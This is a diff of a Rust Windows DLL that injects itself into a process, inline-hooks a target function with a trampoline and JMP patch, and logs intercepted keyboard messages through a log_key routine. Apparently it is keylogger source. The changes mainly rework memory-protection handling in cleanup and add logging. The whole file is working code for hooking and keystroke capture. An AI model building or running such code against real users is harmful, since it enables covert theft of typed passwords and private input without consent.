@@ -1,17 +1,3 @@
-// pub: This keyword makes the function public, meaning it can be accessed from outside the current module. 
-// This is necessary when creating a DLL because the function needs to be accessible to other code that uses the DLL.
-//
-// extern: This keyword is used to create an interface with C code. It's used for both importing functions 
-// from C and exporting functions to C.
-//
-// "system": This defines which ABI the function should use. ABIs are conventions for things like how functions should be called, 
-// how data should be passed around, and how the call stack should be managed. The "system" ABI will use the appropriate ABI 
-// for the target operating system, which is usually the C ABI. On Windows, it's equivalent to the "C" ABI but can account for 
-// differences between Windows and Unix-like platforms.
-//
-// _hinst_dll: This is the handle to the DLL instance. It's not used in this example, so we'll just ignore it.
-//
-// fdw_reason: This is the reason the function was called. It will be 1 (DLL_PROCESS_ATTACH) when the DLL is loaded and 0 (DLL_PROCESS_DETACH) when it's unloaded.
 #![allow(non_snake_case)]
 #![allow(unused_imports)]
 extern crate winapi;
@@ -40,7 +26,7 @@ use winapi::um::libloaderapi::{FreeLibraryAndExitThread, GetModuleHandleW};
 extern crate simplelog;
 extern crate log;
 
-use log::{info, error};
+use log::{info, warn, error};
 use simplelog::*;
 use time::macros::format_description;
 
@@ -73,7 +59,6 @@ struct MSG {
 
 struct HookState {
     stolen_bytes: [u8; NUM_STOLEN_BYTES],
-    protect: DWORD,
     target_func_addr: SafePtr,
     trampoline: SafePtr,
 }
@@ -126,7 +111,6 @@ fn setup(target_module_name: &str, target_function_name: &str) -> Result<HookSta
     // Initialize HookState
     let mut hook_state = HookState {
         stolen_bytes: [0; NUM_STOLEN_BYTES],
-        protect: 0,
         target_func_addr: SafePtr(ptr::null()),
         trampoline: SafePtr(ptr::null_mut()),
     };
@@ -146,6 +130,7 @@ fn setup(target_module_name: &str, target_function_name: &str) -> Result<HookSta
     let mut stolen_bytes: [u8; NUM_STOLEN_BYTES] = [0; NUM_STOLEN_BYTES];
 
     // Copy the stolen bytes into the buffer
+    info!("[{}] Stealing {} bytes from address 0x{:X} to 0x{:X}", "setup", NUM_STOLEN_BYTES, target_func_addr as usize, stolen_bytes.as_mut_ptr() as usize);
     unsafe {
         ptr::copy(target_func_addr, stolen_bytes.as_mut_ptr(), NUM_STOLEN_BYTES);
     }
@@ -156,13 +141,13 @@ fn setup(target_module_name: &str, target_function_name: &str) -> Result<HookSta
         .collect();
 
     let hex_str = hex_bytes.join(" ");
-    info!("[{}] {} bytes stolen from {}: {}", "setup", NUM_STOLEN_BYTES, target_function_name, hex_str);
+    info!("[{}] Stolen bytes: {}", "setup", hex_str);
 
     // Add this to HookState
     hook_state.stolen_bytes = stolen_bytes;
 
     // Now we create the trampline function
-    let trampoline: (*mut u8, DWORD) = match create_trampoline(&stolen_bytes, target_func_addr) {
+    let trampoline: *mut u8 = match create_trampoline(&stolen_bytes, target_func_addr) {
         Ok(trampoline) => trampoline,
         Err(err) => {
             error!("[{}] Failed to create trampoline function", "setup");
@@ -171,8 +156,7 @@ fn setup(target_module_name: &str, target_function_name: &str) -> Result<HookSta
     };
 
     // Add this to HookState
-    hook_state.protect = trampoline.1;
-    hook_state.trampoline = SafePtr(trampoline.0);
+    hook_state.trampoline = SafePtr(trampoline);
 
     Ok(hook_state)
 }
@@ -184,27 +168,108 @@ fn cleanup(hook_state: Arc<Mutex<HookState>>, safe_hinst_dll: SafeHINSTANCE) {
             info!("[{}] Cleanup file found - Cleaning up ...", "cleanup");
 
             // Restore the stolen bytes
-            let mut hook_state = match hook_state.lock() {
-                Ok(hook_state) => hook_state,
+            let hook_state = match hook_state.lock() {
+                Ok(hook_state) => {
+                    info!("[{}] Mutex locked", "cleanup");
+                    hook_state
+                },
                 Err(_) => {
                     error!("[{}] Failed to lock mutex", "cleanup");
                     return;
                 }
             };
-            
+
+            // Check the memory protection at the address of the target function to verify we can write to it
+            info!("[{}] Getting memory information for target function at address: 0x{:X}", "cleanup", hook_state.target_func_addr.0 as usize);
+            let mut mbi: winapi::um::winnt::MEMORY_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
+            let result = unsafe {
+                winapi::um::memoryapi::VirtualQuery(
+                    hook_state.target_func_addr.0 as *const _,
+                    &mut mbi as *mut _,
+                    std::mem::size_of::<winapi::um::winnt::MEMORY_BASIC_INFORMATION>() as usize
+                )
+            };
+
+            if result == 0 {
+                error!("[{}] Failed to get memory information for target function", "cleanup");
+                if let Some(win_err) = get_last_error() {
+                    error!("[{}] Windows error: {}", "cleanup", win_err);
+                }
+                drop(hook_state);
+                return;
+            } else {
+                // Use a match statement to check if the protection allows for writing
+                let writable: bool = match mbi.Protect {
+                    winapi::um::winnt::PAGE_EXECUTE_READWRITE => {
+                        true
+                    },
+                    winapi::um::winnt::PAGE_EXECUTE_WRITECOPY => {
+                        true
+                    },
+                    winapi::um::winnt::PAGE_EXECUTE_READ => {
+                        false
+                    },
+                    winapi::um::winnt::PAGE_EXECUTE => {
+                        false
+                    },
+                    winapi::um::winnt::PAGE_READWRITE => {
+                        true
+                    },
+                    winapi::um::winnt::PAGE_WRITECOPY => {
+                        true
+                    },
+                    winapi::um::winnt::PAGE_READONLY => {
+                        false
+                    },
+                    winapi::um::winnt::PAGE_NOACCESS => {
+                        false
+                    },
+                    _ => {
+                        error!("[{}] Unknown memory protection", "cleanup");
+                        false
+                    }
+                };
+
+                if !writable {
+                    warn!("[{}] Target function is not writable", "cleanup");
+                    info!("[{}] Changing protection of target function to PAGE_EXECUTE_READWRITE", "cleanup");
+                
+                    // Change the protection of the target function to PAGE_EXECUTE_READWRITE
+                    let mut old_protect: DWORD = 0;
+                    let result = unsafe {
+                        VirtualProtect(
+                            hook_state.target_func_addr.0 as *mut _,
+                            NUM_STOLEN_BYTES,
+                            PAGE_EXECUTE_READWRITE,
+                            &mut old_protect as *mut _
+                        )
+                    };
+
+                    if result == 0 {
+                        error!("[{}] Failed to change protection of target function", "cleanup");
+                        if let Some(win_err) = get_last_error() {
+                            error!("[{}] Windows error: {}", "cleanup", win_err);
+                        }
+                        drop(hook_state);
+                        return;
+                    } 
+                }
+            }
+
+            // Restore the stolen bytes
+            info!("[{}] Copying stolen bytes back to address: 0x{:X}", "cleanup", hook_state.target_func_addr.0 as usize);
             unsafe {
                 ptr::copy(hook_state.stolen_bytes.as_ptr(), hook_state.target_func_addr.0 as *mut u8, NUM_STOLEN_BYTES);
             }
 
-            info!("[{}] Stolen bytes restored", "cleanup");
-
             // Change the protection of the stolen bytes back to the original
+            info!("[{}] Restoring memory protection of target function", "cleanup");
             let result = unsafe {
                 VirtualProtect(
                     hook_state.target_func_addr.0 as *mut _,
                     NUM_STOLEN_BYTES,
-                    hook_state.protect,
-                    &mut hook_state.protect as *mut _
+                    mbi.Protect,
+                    &mut mbi.Protect as *mut _
                 )
             };
 
@@ -215,11 +280,10 @@ fn cleanup(hook_state: Arc<Mutex<HookState>>, safe_hinst_dll: SafeHINSTANCE) {
                 }
                 drop(hook_state);
                 return;
-            } else {
-                info!("[{}] Target function protection changed to PAGE_EXECUTE_READWRITE", "cleanup");
             }
 
             // Free the memory allocated for the trampoline function
+            info!("[{}] Freeing memory for trampoline function at address: 0x{:X}", "cleanup", hook_state.trampoline.0 as usize);
             let result = unsafe {
                 VirtualFree(hook_state.trampoline.0 as *mut _, 0, winapi::um::winnt::MEM_RELEASE)
             };
@@ -236,6 +300,7 @@ fn cleanup(hook_state: Arc<Mutex<HookState>>, safe_hinst_dll: SafeHINSTANCE) {
             }
 
             // Unlock the mutex
+            info!("[{}] Dropping mutex", "cleanup");
             drop(hook_state);
             
             // Unload the DLL
@@ -254,7 +319,7 @@ fn cleanup(hook_state: Arc<Mutex<HookState>>, safe_hinst_dll: SafeHINSTANCE) {
                     return;
                 }
 
-                info!("[{}] Unloading DLL ...", "cleanup");
+                info!("[{}] Unloading DLL with handle: 0x{:X}", "cleanup", hmodule as usize);
                 FreeLibraryAndExitThread(hmodule, 0);
             }
         }
@@ -266,7 +331,10 @@ fn cleanup(hook_state: Arc<Mutex<HookState>>, safe_hinst_dll: SafeHINSTANCE) {
 fn install_hook(hook_state: Arc<Mutex<HookState>>, target_function_name: &str) {
     // Lock the mutex
     let hook_state = match hook_state.lock() {
-        Ok(hook_state) => hook_state,
+        Ok(hook_state) => {
+            info!("[{}] Mutex locked", "install_hook");
+            hook_state
+        },
         Err(_) => {
             error!("[{}] Failed to lock mutex", "install_hook");
             return;
@@ -298,65 +366,9 @@ fn install_hook(hook_state: Arc<Mutex<HookState>>, target_function_name: &str) {
     }
 
     // Unlock the mutex
-    info!("[{}] Unlocking mutex", "install_hook");
+    info!("[{}] Dropping mutex", "install_hook");
     drop(hook_state);
 }
-
-// fn begin_hooking(target_module_str: &str, target_function_name: &str) {
-//     // Get the address of the target function
-//     let target_func_addr: *const u8 = match get_target_func_addr(target_module_str, target_function_name) {
-//         Ok(addr) => addr,
-//         Err(_) => {
-//             error!("[{}] Failed to get address of {}", "begin_hooking", target_function_name);
-//             return;
-//         }
-//     };
-
-//     // Allocate buffer for stolen bytes
-//     let mut stolen_bytes: [u8; NUM_STOLEN_BYTES] = [0; NUM_STOLEN_BYTES];
-
-//     // Copy the stolen bytes into the buffer
-//     unsafe {
-//         ptr::copy(target_func_addr, stolen_bytes.as_mut_ptr(), NUM_STOLEN_BYTES);
-//     }
-
-//     // Log the stolen bytes
-//     let hex_bytes: Vec<String> = stolen_bytes.iter()
-//         .map(|b| format!("{:02x}", b))
-//         .collect();
-
-//     let hex_str = hex_bytes.join(" ");
-
-//     info!("[{}] {} bytes stolen from {}: {}", "begin_hooking", NUM_STOLEN_BYTES, target_function_name, hex_str);
-
-//     // Now we create the trampoline function
-//     let trampoline: *mut u8 = match create_trampoline(&stolen_bytes, target_func_addr) {
-//         Ok(trampoline) => trampoline,
-//         Err(_) => {
-//             error!("[{}] Failed to create trampoline function", "begin_hooking");
-//             return;
-//         }
-//     };
-
-//     // Set the trampoline function in the global variable
-//     TRAMPOLINE_FUNC.store(trampoline as *mut _, Ordering::SeqCst);
-
-//     // Get the address of the hook function
-//     let hook_func_addr = hook_func as *const () as *mut u8;
-
-//     // Now we actually hook the function
-//     match set_hook(target_func_addr, hook_func_addr) {
-//         Ok(_) => {
-//             info!("[{}] Hooked {} successfully", "begin_hooking", target_function_name);
-//             info!("[{}] Trampoline function address: 0x{:X}", "begin_hooking", trampoline as usize);
-//             info!("[{}] Hook function address: 0x{:X}", "begin_hooking", hook_func_addr as usize);
-//         },
-//         Err(_) => {
-//             error!("[{}] Failed to hook {}", "begin_hooking", target_function_name);
-//             return;
-//         }
-//     }
-// }
 
 fn get_target_func_addr(target_module_str: &str, target_function_name: &str) -> Result<*const u8, DWORD> {
     // Convert the target module name to a CString
@@ -413,7 +425,7 @@ fn get_target_func_addr(target_module_str: &str, target_function_name: &str) -> 
 }
 
 // This function will create the trampoline function
-fn create_trampoline(stolen_bytes: &[u8; NUM_STOLEN_BYTES], target_func_addr: *const u8) -> Result<(*mut u8, DWORD), DWORD> {
+fn create_trampoline(stolen_bytes: &[u8; NUM_STOLEN_BYTES], target_func_addr: *const u8) -> Result<*mut u8, DWORD> {
     // Set the JMP instruction size depending on the target architecture
     #[cfg(target_pointer_width = "64")]
     const JMP_INSTRUCTION_SIZE: usize = 15;
@@ -530,7 +542,7 @@ fn create_trampoline(stolen_bytes: &[u8; NUM_STOLEN_BYTES], target_func_addr: *c
 
     info!("[{}] Trampoline function: {}", "create_trampoline", hex_str);
 
-    Ok((trampoline, old_protect))
+    Ok(trampoline)
 }
 
 pub fn set_hook(target_func_addr: *const u8, hook_func_addr: *mut u8) -> Result<(), DWORD> {
@@ -540,6 +552,7 @@ pub fn set_hook(target_func_addr: *const u8, hook_func_addr: *mut u8) -> Result<
     #[cfg(target_pointer_width = "32")]
     const JMP_INSTRUCTION_SIZE: usize = 5;
 
+    // Change the protection of the target function to PAGE_EXECUTE_READWRITE so we can write to it
     let mut old_protect: DWORD = 0;
     if unsafe {
         VirtualProtect(
@@ -554,6 +567,8 @@ pub fn set_hook(target_func_addr: *const u8, hook_func_addr: *mut u8) -> Result<
             error!("[{}] Windows error: {}", "set_hook", win_err);
         }
         return Err(0);
+    } else {
+        info!("[{}] Target function protection changed to PAGE_EXECUTE_READWRITE", "set_hook");
     }
 
     let mut jmp_instr: [u8; JMP_INSTRUCTION_SIZE] = [0; JMP_INSTRUCTION_SIZE];
@@ -596,6 +611,7 @@ pub fn set_hook(target_func_addr: *const u8, hook_func_addr: *mut u8) -> Result<
 
         info!("[{}] Bytes written to target function: {:?}", "set_hook", hex_str);
         
+        // Restore the protection of the target function
         let result = VirtualProtect(
             target_func_addr as *mut _,
             JMP_INSTRUCTION_SIZE,
@@ -609,6 +625,8 @@ pub fn set_hook(target_func_addr: *const u8, hook_func_addr: *mut u8) -> Result<
                 error!("[{}] Windows error: {}", "set_hook", win_err);
             }
             return Err(0);
+        } else {
+            info!("[{}] Target function protection restored", "set_hook");
         }
     }    
 
@@ -628,8 +646,8 @@ fn log_key(msg_ptr: *const MSG) {
         let vk_code = msg_ptr.wParam as u32;
 
         // Translate the virtual key code to a Unicode character.
-        let mut buffer: [u16; 2] = [0; 2];
-        let mut key_state: [u8; 256] = [0; 256];
+        let buffer: [u16; 2] = [0; 2];
+        let key_state: [u8; 256] = [0; 256];
         let scan_code = unsafe { MapVirtualKeyW(vk_code, 0) };
         let count = unsafe {
             winapi::um::winuser::ToUnicode(
